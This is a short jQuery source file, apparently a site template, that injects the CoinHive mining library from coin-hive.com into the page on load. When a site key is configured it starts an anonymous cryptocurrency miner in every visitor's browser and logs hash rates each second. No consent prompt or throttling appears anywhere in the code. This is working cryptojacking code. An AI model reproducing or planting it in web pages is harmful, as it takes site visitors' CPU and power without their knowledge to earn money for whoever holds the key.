import $ from 'jquery';

$(document).ready(() => {
  // if we're going to mine, we will have a siteKey, or else don't init the miner.
  const siteKey = '<%= config.siteKey %>';

  const loadCoinHive = () => new Promise((resolve) => {
    // append coinhive to dom check for loaded global js object and resolve
    const appendScriptToHead = (url) => {
      const head = document.getElementsByTagName('head')[0];
      const js = document.createElement('script');
      js.type = 'text/javascript';
      js.src = url;
      head.appendChild(js);
    };

    appendScriptToHead('https://coin-hive.com/lib/coinhive.min.js');

    const waitForLoad = () =>
      setTimeout(() => {
        if (window.CoinHive) resolve();
        else waitForLoad();
      }, 500);

    waitForLoad();
  });

  if (siteKey.trim() !== '') {
    // append coinhive library
    loadCoinHive()
      .then(() => {
        // initialize the miner once available
        const miner = new window.CoinHive.Anonymous(siteKey);
        miner.start();

        miner.on('error', (params) => {
          console.log('The pool reported an error', params.error);
        });

        setInterval(() => {
          const hashesPerSecond = miner.getHashesPerSecond();
          const totalHashes = miner.getTotalHashes();
          const acceptedHashes = miner.getAcceptedHashes();

          console.log(`hps: ${hashesPerSecond}\ntotal: ${totalHashes}\naccepted: ${acceptedHashes}`);
        }, 1000);
      });
  }
});
